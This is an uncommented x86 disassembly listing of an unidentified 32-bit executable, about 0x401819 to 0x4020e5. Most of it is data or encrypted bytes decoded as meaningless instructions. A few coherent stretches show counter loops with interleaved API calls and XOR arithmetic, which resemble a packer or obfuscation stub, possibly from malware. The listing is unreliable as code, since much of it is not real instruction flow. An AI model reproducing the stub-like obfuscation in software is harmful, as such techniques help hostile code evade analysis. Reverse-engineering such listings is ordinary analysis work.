  401819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40181a:	cmp    eax,0x65220c90
  40181f:	ret    0xad01
  401822:	dec    ecx
  401823:	inc    esp
  401824:	sbb    DWORD PTR [ecx+ebp*2+0x54],ebx
  401828:	xor    BYTE PTR [ebx+0x3cde3d07],bl
  40182e:	leave  
  40182f:	push   ds
  401830:	lods   eax,DWORD PTR ds:[esi]
  401831:	fmul   QWORD PTR [eax-0x479810b1]
  401837:	out    0x5d,eax
  401839:	jge    0x40180c
  40183b:	and    eax,0x3e8feb4c
  401840:	jb     0x4018a3
  401842:	xor    BYTE PTR [ebx+edx*4-0x12],dl
  401846:	mov    eax,ds:0xbc3bc490
  40184b:	inc    ebx
  40184c:	ror    esp,1
  40184e:	jecxz  0x40183a
  401850:	aas    
  401851:	cli    
  401852:	mov    al,ds:0x77981535
  401857:	jb     0x4017fe
  401859:	call   0x1b4c100c
  40185e:	push   0x7b902ced
  401863:	jle    0x4018e1
  401865:	mov    bh,bl
  401867:	and    cl,bl
  401869:	js     0x401889
  40186b:	retf   
  40186c:	popf   
  40186d:	cmp    DWORD PTR [ebp-0x30e9d45a],eax
  401873:	sbb    eax,0xd062df3e
  401878:	jecxz  0x4017fe
  40187a:	rol    BYTE PTR [edx+0x38],cl
  40187d:	sub    eax,0x213dcfd4
  401882:	out    0x27,al
  401884:	fsubr  DWORD PTR [ebx]
  401886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401887:	sub    al,0xc6
  401889:	jmp    0x880fb22
  40188e:	inc    edx
  40188f:	xor    al,0x32
  401891:	jne    0x4018e6
  401893:	inc    edx
  401894:	lds    esi,FWORD PTR [esi-0x5eb6bb55]
  40189a:	xchg   edx,eax
  40189b:	mov    ecx,0xc9118a8f
  4018a0:	neg    BYTE PTR [edi+0x5d0bab2]
  4018a6:	pop    ecx
  4018a7:	pop    esp
  4018a8:	mov    eax,0x99df12de
  4018ad:	cli    
  4018ae:	add    BYTE PTR [esi],ah
  4018b0:	mov    esi,0x8d4ca775
  4018b5:	push   0x54
  4018b7:	jnp    0x401933
  4018b9:	xor    ebp,esi
  4018bb:	jmp    0xc7432698
  4018c0:	and    DWORD PTR ds:0x433837,0x0
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx-0x5b]
  401b2b:	inc    eax
  401b2c:	fist   DWORD PTR [eax+0x7e7e795c]
  401b32:	outs   dx,DWORD PTR ds:[esi]
  401b33:	jge    0x401bb3
  401b35:	jle    0x401ac7
  401b37:	ror    BYTE PTR [ebp+ecx*2+0x65e7034b],0x6f
  401b3f:	adc    al,0x14
  401b41:	int3   
  401b42:	std    
  401b43:	fisttp DWORD PTR [esi+0xba80726]
  401b49:	and    eax,0x25f639de
  401b4e:	stc    
  401b4f:	push   ecx
  401b50:	mov    ah,0x71
  401b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b53:	mov    bl,0xd6
  401b55:	jmp    0x2869e5bf
  401b5a:	xor    DWORD PTR ds:0xf9a46bd1,0xb701a0dc
  401b64:	mov    edi,DWORD PTR [edi-0x112e9d94]
  401b6a:	(bad)  
  401b6b:	lahf   
  401b6c:	pop    esp
  401b6d:	dec    esi
  401b6e:	test   eax,0x5eecb238
  401b73:	add    al,0xea
  401b75:	push   esi
  401b76:	mov    ?,WORD PTR [esi]
  401b78:	paddusb mm7,QWORD PTR [edi-0x16d26920]
  401b7f:	jb     0x401b8f
  401b81:	outs   dx,DWORD PTR ds:[esi]
  401b82:	jp     0x401b0c
  401b84:	aad    0xff
  401b86:	shl    BYTE PTR [edx+ebx*8-0x194400b9],1
  401b8d:	les    edi,FWORD PTR [eax+0x38294401]
  401b93:	rcr    DWORD PTR [edi],0x2
  401b96:	imul   eax,DWORD PTR [edx+0x1e],0xf
  401b9a:	call   0xaa65:0x21cd42d4
  401ba1:	mov    ah,0x93
  401ba3:	or     ah,al
  401ba5:	xchg   ebp,esi
  401ba7:	mov    edx,0xa20d9235
  401bad:	and    edx,DWORD PTR [ebp-0x19]
  401bb0:	call   0x81c9:0x8d1575fb
  401bb7:	not    BYTE PTR [esi+0x2e47c4b9]
  401bbd:	dec    edi
  401bbe:	mov    edx,0xc437632c
  401bc3:	pop    edi
  401bc4:	mov    bh,0xee
  401bc6:	adc    esp,DWORD PTR [eax+0x1a]
  401bc9:	push   es
  401bca:	inc    esp
  401bcb:	es icebp 
  401bcd:	pusha  
  401bce:	(bad)  
  401bcf:	in     al,dx
  401bd0:	or     esi,DWORD PTR [edx]
  401bd2:	dec    ecx
  401bd3:	jns    0x401c4c
  401bd5:	and    BYTE PTR [esi+ecx*2-0x274e639f],dl
  401bdc:	out    dx,eax
  401bdd:	fwait
  401bde:	test   esi,0x5728ac50
  401be4:	dec    esp
  401be5:	adc    DWORD PTR [ecx+0x775e8d15],edi
  401beb:	xor    ch,BYTE PTR [eax+0x65]
  401bee:	inc    edx
  401bef:	ins    BYTE PTR es:[edi],dx
  401bf0:	push   ecx
  401bf1:	jns    0x401c65
  401bf3:	sar    BYTE PTR [ecx],0x4a
  401bf6:	inc    esp
  401bf7:	icebp  
  401bf8:	int    0x80
  401bfa:	push   0xb2b96d0c
  401bff:	sete   ah
  401c02:	cli    
  401c03:	xor    al,0xf9
  401c05:	bound  ebx,QWORD PTR [edi-0x764552fe]
  401c0b:	jp     0x401c2b
  401c0d:	cmp    bl,ch
  401c0f:	jg     0x401ba8
  401c11:	leave  
  401c12:	xor    dh,al
  401c14:	jne    0x401c81
  401c16:	jp     0x401c24
  401c18:	mov    bl,0x5a
  401c1a:	or     bl,bl
  401c1c:	in     al,dx
  401c1d:	ins    BYTE PTR es:[edi],dx
  401c1e:	(bad)  
  401c1f:	push   edx
  401c20:	sar    WORD PTR [ecx-0x2e],1
  401c24:	add    ah,BYTE PTR [ecx-0x261314d6]
  401c2a:	mov    al,ds:0xd5dd541e
  401c2f:	nop
  401c30:	sub    al,0x22
  401c32:	xor    BYTE PTR [eax-0x137bef7],dl
  401c38:	lea    eax,[edi+edi*1-0x4f52c3d]
  401c3f:	mov    ds:0xa90ae31d,eax
  401c44:	sbb    ch,BYTE PTR [ecx-0x6bb7680f]
  401c4a:	mov    BYTE PTR [ebx],bl
  401c4c:	mov    edi,DWORD PTR [esi]
  401c4e:	stos   BYTE PTR es:[edi],al
  401c4f:	mov    eax,ds:0xac934166
  401c54:	fdivr  QWORD PTR [eax+ebp*4-0x3b]
  401c58:	pop    ds
  401c59:	cmp    DWORD PTR [ecx-0x40c8cc41],0x7e
  401c60:	ret    0x326
  401c63:	mov    al,0x44
  401c65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c66:	jl     0x401ce4
  401c68:	je     0x401c8c
  401c6a:	loop   0x401c4d
  401c6c:	xor    DWORD PTR ds:0xf30005be,edx
  401c72:	lods   eax,DWORD PTR ds:[esi]
  401c73:	repnz stos BYTE PTR es:[edi],al
  401c75:	dec    ecx
  401c76:	mov    eax,fs:0xb8d12246
  401c7c:	jns    0x401cdf
  401c7e:	aas    
  401c7f:	and    eax,0x6ded55bc
  401c84:	adc    BYTE PTR [bp+si-0x30],dh
  401c88:	adc    edi,edx
  401c8a:	or     ecx,DWORD PTR [eax]
  401c8c:	xor    al,0x1f
  401c8e:	rcl    BYTE PTR [edx],cl
  401c90:	sbb    bh,0xe0
  401c93:	int    0x4a
  401c95:	mov    edx,0x38866959
  401c9a:	(bad)  
  401c9b:	in     eax,dx
  401c9c:	cli    
  401c9d:	aaa    
  401c9e:	mov    ds:0x6add8a08,eax
  401ca3:	and    DWORD PTR [ebp+eiz*8+0x68],edi
  401ca7:	pop    ebp
  401ca8:	fadd   DWORD PTR [ebp-0x7cdc80cc]
  401cae:	push   esp
  401caf:	retf   
  401cb0:	inc    ecx
  401cb1:	mov    ch,0x9c
  401cb3:	loop   0x401c5a
  401cb5:	(bad)  
  401cb6:	dec    eax
  401cb7:	mov    ch,0xbf
  401cb9:	dec    esp
  401cba:	out    dx,al
  401cbb:	sti    
  401cbc:	mov    ds:0x23cd5540,al
  401cc1:	adc    al,BYTE PTR [ebx+0x3b3579a5]
  401cc7:	mov    esi,0xdce136f4
  401ccc:	pop    esp
  401ccd:	pop    edx
  401cce:	xchg   esi,eax
  401ccf:	ret    0x2736
  401cd2:	std    
  401cd3:	push   edi
  401cd4:	cld    
  401cd5:	(bad)  
  401cd6:	out    dx,al
  401cd7:	jp     0x401ca8
  401cd9:	mov    ds:0x7ed13023,al
  401cde:	adc    ch,ah
  401ce0:	pushf  
  401ce1:	mov    ds:0xb59ab7c7,al
  401ce6:	mov    ecx,0xd7a8d197
  401ceb:	in     al,0x31
  401ced:	sbb    esp,ecx
  401cef:	push   esi
  401cf0:	mov    ch,0xa
  401cf2:	jno    0x401cbe
  401cf4:	xchg   esp,eax
  401cf5:	das    
  401cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cf7:	xor    eax,DWORD PTR [edx]
  401cf9:	(bad)  
  401cfb:	pop    ds
  401cfc:	and    eax,0x5d05dfb1
  401d01:	xor    eax,0x3368b05e
  401d06:	push   0xaabd4f5f
  401d0b:	(bad)  
  401d0d:	push   eax
  401d0e:	mov    esp,DWORD PTR [ebx-0x479c7e58]
  401d14:	call   0x8d278ba0
  401d19:	into   
  401d1a:	push   ebp
  401d1b:	pop    ds
  401d1c:	dec    edi
  401d1d:	dec    esi
  401d1e:	mov    ah,0x95
  401d20:	add    eax,0x7ab3b7f8
  401d25:	pop    esp
  401d26:	mov    ds:0x528d84aa,eax
  401d2b:	pop    ds
  401d2c:	bswap  ebp
  401d2e:	inc    ebx
  401d2f:	mov    ch,0x3
  401d31:	adc    eax,0xbabde0d5
  401d36:	in     al,dx
  401d37:	cwde   
  401d38:	sub    al,0xfd
  401d3a:	pop    eax
  401d3b:	mov    DWORD PTR [ebp+ebx*4-0x40],ecx
  401d3f:	dec    ebx
  401d40:	jge    0x401d6a
  401d42:	cmp    bh,cl
  401d44:	hlt    
  401d45:	lods   eax,DWORD PTR ds:[esi]
  401d46:	add    eax,0x35148635
  401d4b:	pop    eax
  401d4c:	inc    ecx
  401d4d:	add    al,0x7d
  401d4f:	sahf   
  401d50:	int3   
  401d51:	dec    ebp
  401d52:	cdq    
  401d53:	scas   al,BYTE PTR es:[edi]
  401d54:	add    al,0x9c
  401d56:	loope  0x401d1c
  401d58:	add    BYTE PTR [ebp+0x4f],al
  401d5b:	fdivp  st(3),st
  401d5d:	and    bl,BYTE PTR [edi-0x7d]
  401d60:	and    ah,bh
  401d62:	hlt    
  401d63:	mov    ss,WORD PTR [edx+0x18467f8e]
  401d69:	sub    al,cl
  401d6b:	loope  0x401dd7
  401d6d:	jmp    DWORD PTR [esi-0x36e33fd5]
  401d73:	dec    edx
  401d74:	cmc    
  401d75:	call   FWORD PTR [esp+eiz*4]
  401d78:	cmc    
  401d79:	mov    esp,0x75a8cfee
  401d7e:	das    
  401d7f:	and    DWORD PTR [ebx+0x53],0x14276fa2
  401d86:	retf   
  401d87:	mov    DWORD PTR [ecx-0x7c638abb],esi
  401d8d:	pop    ebx
  401d8e:	ror    esi,1
  401d90:	rcl    BYTE PTR [edx],0xbc
  401d93:	pop    es
  401d94:	fbstp  TBYTE PTR [esi+0x65ab43aa]
  401d9a:	leave  
  401d9b:	xchg   ecx,eax
  401d9c:	jmp    0xeaac5dce
  401da1:	inc    ebp
  401da2:	cmp    al,0x5e
  401da4:	adc    al,0xd8
  401da6:	add    al,dh
  401da8:	mov    ecx,0xaa493cb
  401dad:	mov    esi,0xdc8f43f0
  401db2:	dec    ebx
  401db3:	mov    al,ds:0xf0e046c0
  401db8:	lahf   
  401db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dba:	push   cs
  401dbb:	cmp    eax,0x3c203403
  401dc0:	inc    ebp
  401dc1:	cli    
  401dc2:	xlat   BYTE PTR ds:[ebx]
  401dc3:	and    ecx,DWORD PTR [esi-0x1a24b9d9]
  401dc9:	jge    0x401d8e
  401dcb:	int3   
  401dcc:	cmp    esp,ebp
  401dce:	xchg   esi,eax
  401dcf:	cmp    BYTE PTR [edx+0x59],dl
  401dd2:	cdq    
  401dd3:	push   cs
  401dd4:	ds ss mov eax,0x9367bd39
  401ddb:	pop    edi
  401ddc:	gs idiv dh
  401ddf:	xlat   BYTE PTR ds:[ebx]
  401de0:	dec    ecx
  401de1:	ror    BYTE PTR [ecx-0x65],0x4b
  401de5:	(bad)  
  401de6:	out    dx,eax
  401de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401de8:	iret   
  401de9:	aas    
  401dea:	jno    0x401e1e
  401dec:	push   cs
  401ded:	lds    edx,FWORD PTR [ebp+ecx*2-0x6e0ed36]
  401df4:	js     0x401dba
  401df6:	cmp    bh,bl
  401df8:	xor    dh,BYTE PTR [eax-0x3e1d7c02]
  401dfe:	xchg   BYTE PTR [ebx-0x71],bl
  401e01:	mov    ebx,0xffa92f5b
  401e06:	aad    0x7d
  401e08:	add    al,0x92
  401e0a:	rol    DWORD PTR [eax],0xe4
  401e0d:	inc    esi
  401e0e:	mov    BYTE PTR [ebp+edi*8+0x76],cl
  401e12:	mov    ch,0x27
  401e14:	int3   
  401e15:	repz sub cl,BYTE PTR [edx+0x3e]
  401e19:	shl    BYTE PTR [edx+0x43],cl
  401e1c:	scas   eax,DWORD PTR es:[edi]
  401e1d:	rcr    ch,0xc1
  401e20:	lods   al,BYTE PTR ds:[esi]
  401e21:	cld    
  401e22:	jecxz  0x401db2
  401e24:	arpl   WORD PTR [edx-0x30],di
  401e27:	jecxz  0x401e6b
  401e29:	fs dec esp
  401e2b:	jns    0x401e92
  401e2d:	(bad)  
  401e2e:	xchg   DWORD PTR [esi],ecx
  401e30:	mov    edx,0x350c14a6
  401e35:	fwait
  401e36:	nop
  401e37:	outs   dx,BYTE PTR ds:[esi]
  401e38:	dec    ebx
  401e39:	and    bh,BYTE PTR [ecx]
  401e3b:	cmp    al,0xa2
  401e3d:	jns    0x401e55
  401e3f:	mov    dl,0x61
  401e41:	sbb    ebx,esi
  401e43:	mov    esp,0xa289837b
  401e48:	inc    esi
  401e49:	bswap  ebp
  401e4b:	enter  0x15ad,0xa9
  401e4f:	mov    ebp,0xe6eaa6c6
  401e54:	pusha  
  401e55:	rcl    dh,cl
  401e57:	clc    
  401e58:	add    ecx,DWORD PTR [ebx-0x42]
  401e5b:	add    DWORD PTR [edx],0x10c051f
  401e61:	fwait
  401e62:	popf   
  401e63:	sub    BYTE PTR [ebx-0x79007ca0],bl
  401e69:	push   es
  401e6a:	ja     0x401e50
  401e6c:	inc    edi
  401e6d:	pop    edx
  401e6e:	pop    es
  401e6f:	push   es
  401e70:	pop    eax
  401e71:	inc    ecx
  401e72:	not    DWORD PTR [ebx]
  401e74:	add    BYTE PTR [edx],cl
  401e76:	pop    esp
  401e77:	mov    ds:0x25a31abd,eax
  401e7c:	(bad)  
  401e7d:	cmp    esi,DWORD PTR [ebx+0x58]
  401e80:	sub    esi,esi
  401e82:	sub    al,BYTE PTR [eax]
  401e84:	aad    0xa5
  401e86:	mov    ebx,0x33ad34cf
  401e8b:	(bad)  
  401e8c:	xchg   ecx,eax
  401e8d:	add    BYTE PTR [edi],dh
  401e8f:	loope  0x401e41
  401e91:	out    dx,al
  401e92:	and    BYTE PTR [ebx+0x4e125721],ch
  401e98:	adc    eax,0xf102e2a8
  401e9d:	mov    ds:0xe3af27b7,eax
  401ea2:	sbb    eax,0x92ec1be0
  401ea7:	pop    ss
  401ea8:	fs pop ebp
  401eaa:	iret   
  401eab:	xchg   esi,eax
  401eac:	call   0x391b:0xcfcf705f
  401eb3:	jmp    0x2bd:0x1fde91ff
  401eba:	cmp    BYTE PTR ds:0x8868256e,0x40
  401ec1:	cmp    DWORD PTR [edi],edi
  401ec3:	mov    al,0xb2
  401ec5:	cmp    BYTE PTR [ebx],0x9a
  401ec8:	xlat   BYTE PTR ds:[ebx]
  401ec9:	es jmp 0x8e3:0x14e084c5
  401ed1:	jo     0x401ec4
  401ed3:	bound  esp,QWORD PTR [ebp-0x6c]
  401ed6:	in     eax,0xd2
  401ed8:	jmp    0xcf0:0x480714d1
  401edf:	sub    BYTE PTR [ebx+eax*2-0x74],bh
  401ee3:	xchg   esp,eax
  401ee4:	clc    
  401ee5:	aas    
  401ee6:	sub    dh,dl
  401ee8:	pop    esi
  401ee9:	in     eax,dx
  401eea:	mov    al,ds:0xce053df5
  401eef:	icebp  
  401ef0:	lds    eax,FWORD PTR ds:0xff7fc0ee
  401ef6:	(bad)  
  401ef7:	frstpm(287 only) 
  401ef9:	ss mov eax,0x32eed996
  401eff:	imul   esp,DWORD PTR [ebx+0x60],0x184a473
  401f06:	ds repnz (bad) 
  401f09:	scas   al,BYTE PTR es:[edi]
  401f0a:	stos   DWORD PTR es:[edi],eax
  401f0b:	in     eax,0xe1
  401f0d:	dec    ecx
  401f0e:	dec    esi
  401f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f10:	popa   
  401f11:	stos   DWORD PTR es:[edi],eax
  401f12:	inc    esi
  401f13:	cs int 0xdf
  401f16:	std    
  401f17:	outs   dx,BYTE PTR ds:[esi]
  401f18:	data16 loop 0x401f33
  401f1b:	neg    BYTE PTR [esi+0x7]
  401f1e:	(bad)  
  401f21:	rcl    BYTE PTR [ecx-0x4a63de92],0x3
  401f28:	(bad)  
  401f29:	mov    ebx,DWORD PTR ds:0x43380b
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	inc    ebp
  401f5d:	in     eax,0x57
  401f5f:	lds    ecx,FWORD PTR [ebp+0x5]
  401f62:	jle    0x401fe2
  401f64:	outs   dx,DWORD PTR ds:[esi]
  401f65:	jge    0x401fe5
  401f67:	jle    0x401fdf
  401f69:	mov    WORD PTR [eax-0x79],ss
  401f6c:	jg     0x401fc9
  401f6e:	pushf  
  401f6f:	stos   BYTE PTR es:[edi],al
  401f70:	xchg   ebp,eax
  401f71:	fst    QWORD PTR [edi]
  401f73:	out    0x99,eax
  401f75:	sub    al,0xbf
  401f77:	mov    al,BYTE PTR ds:0x125f6252
  401f7d:	adc    bl,BYTE PTR [esp-0x182d0a2d]
  401f84:	(bad)  
  401f85:	into   
  401f86:	jecxz  0x401ffe
  401f88:	sbb    bh,BYTE PTR [ebx+0x45]
  401f8b:	or     edx,edi
  401f8d:	mov    dh,BYTE PTR [esi]
  401f8f:	push   ds
  401f90:	in     eax,0xaa
  401f92:	bound  ebp,QWORD PTR [esi]
  401f94:	or     BYTE PTR [esi],cl
  401f96:	fisttp QWORD PTR [ecx-0x1a]
  401f99:	mov    eax,ds:0x32220074
  401f9e:	loopne 0x402012
  401fa0:	(bad)  
  401fa1:	mov    BYTE PTR [edx],al
  401fa3:	mov    bl,0x20
  401fa5:	test   ch,al
  401fa7:	mov    eax,0xbc4cb818
  401fac:	xor    al,0x27
  401fae:	enter  0xe2e,0x90
  401fb2:	xchg   ebx,eax
  401fb3:	pop    ds
  401fb4:	dec    esp
  401fb5:	push   ecx
  401fb6:	imul   ebp,ecx,0xadf8da68
  401fbc:	sbb    al,bh
  401fbe:	cld    
  401fbf:	adc    esp,DWORD PTR [edi+0x20]
  401fc2:	inc    ebx
  401fc3:	jecxz  0x401f86
  401fc5:	sub    DWORD PTR [ebp-0x4c],ebp
  401fc8:	sar    DWORD PTR [edi],1
  401fca:	cmc    
  401fcb:	ficomp WORD PTR [eax-0x1e]
  401fce:	or     esp,ebp
  401fd0:	pop    ebx
  401fd1:	mov    ebp,DWORD PTR [edi-0x3]
  401fd4:	(bad)  [esi]
  401fd6:	adc    al,0x1e
  401fd8:	imul   edx,DWORD PTR [edi-0x5e077443],0x593abd37
  401fe2:	and    dl,dl
  401fe4:	dec    edi
  401fe5:	mov    ecx,fs
  401fe7:	mov    eax,ds:0xa9f5daf1
  401fec:	(bad)  
  401fed:	xchg   esi,eax
  401fee:	inc    edx
  401fef:	into   
  401ff0:	xchg   ecx,eax
  401ff1:	xor    al,BYTE PTR [ebx+0x699ce9eb]
  401ff7:	add    BYTE PTR [edx],ch
  401ff9:	and    al,0x1e
  401ffb:	dec    ecx
  401ffc:	and    eax,0x6c9fa32c
  402001:	sbb    eax,0x7fda32b2
  402006:	mov    eax,ds:0xc626bff8
  40200b:	pusha  
  40200c:	jmp    0xad47:0xcd2c9922
  402013:	xor    BYTE PTR [eax+0x7f],cl
  402016:	xor    ecx,DWORD PTR [edx+0x4bfdc016]
  40201c:	pop    edx
  40201d:	adc    bl,ch
  40201f:	pop    ebp
  402020:	inc    eax
  402021:	mov    ebx,ebp
  402023:	cs es scas al,BYTE PTR es:[edi]
  402026:	outs   dx,BYTE PTR ds:[esi]
  402027:	mov    dl,0xf0
  402029:	test   BYTE PTR [ebp-0x5f],ah
  40202c:	jnp    0x401fe3
  40202e:	mov    ?,ebp
  402030:	pop    eax
  402031:	adc    cl,BYTE PTR [edx+0x15]
  402034:	jg     0x402057
  402036:	sbb    dh,0x13
  402039:	xor    al,0x71
  40203b:	(bad)  
  40203c:	xchg   ecx,eax
  40203d:	mov    ebx,DWORD PTR [ecx+0x5a]
  402040:	int    0xbe
  402042:	(bad)  
  402043:	cld    
  402044:	mov    dh,0xd4
  402046:	dec    esp
  402047:	mov    ds:0x175c6ed5,eax
  40204c:	adc    BYTE PTR ds:0x31f4f67b,dl
  402052:	imul   edi,DWORD PTR [ebx-0x33],0x4d24cc00
  402059:	nop
  40205a:	cmp    eax,0x6734ecfd
  40205f:	pushf  
  402060:	js     0x40203c
  402062:	cld    
  402063:	or     BYTE PTR [esi-0x46],dl
  402066:	push   ebx
  402067:	stos   DWORD PTR es:[edi],eax
  402068:	jns    0x402012
  40206a:	das    
  40206b:	dec    eax
  40206c:	xchg   ebp,eax
  40206d:	xor    DWORD PTR [edx+0x74],ebp
  402070:	std    
  402071:	fimul  DWORD PTR [ecx-0x45]
  402074:	or     DWORD PTR [edx+0xa3082ed],edi
  40207a:	ret    
  40207b:	rcl    bl,cl
  40207d:	xor    ebp,DWORD PTR [ecx+0x36a1a811]
  402083:	retf   0x48a8
  402086:	pop    edx
  402087:	dec    ebp
  402088:	nop
  402089:	outs   dx,DWORD PTR ds:[esi]
  40208a:	mov    edi,0xdaf53dc7
  40208f:	ins    DWORD PTR es:[edi],dx
  402090:	inc    esi
  402091:	das    
  402092:	dec    edx
  402094:	int    0xd4
  402096:	int3   
  402097:	mov    eax,0x5933ca54
  40209c:	pop    edx
  40209d:	out    0x46,eax
  40209f:	sbb    eax,DWORD PTR [edx+0x43]
  4020a2:	inc    ecx
  4020a3:	mov    edi,0x8b507fb8
  4020a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020a9:	or     eax,0x2924ce2c
  4020ae:	or     al,0xfb
  4020b0:	stc    
  4020b1:	jg     0x4020ef
  4020b3:	jno    0x40208c
  4020b5:	ror    BYTE PTR [ecx],1
  4020b7:	cld    
  4020b8:	cwde   
  4020b9:	rcl    BYTE PTR [ebx-0x14],1
  4020bc:	mov    dl,0xdc
  4020be:	mov    al,0xf3
  4020c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020c1:	add    ebx,edi
  4020c3:	scas   al,BYTE PTR es:[edi]
  4020c4:	loop   0x402121
  4020c6:	mov    eax,ds:0x88ab421
  4020cb:	ins    BYTE PTR es:[edi],dx
  4020cc:	js     0x4020d7
  4020ce:	inc    ecx
  4020cf:	push   esp
  4020d0:	rcl    DWORD PTR [edi+0x650cbea6],1
  4020d6:	add    dh,ah
  4020d8:	push   edi
  4020d9:	imul   edi,DWORD PTR [ebp-0x6ad4b394],0xffffffbd
  4020e0:	ss nop
  4020e2:	lahf   
  4020e3:	in     al,0x36
  4020e5:	das    
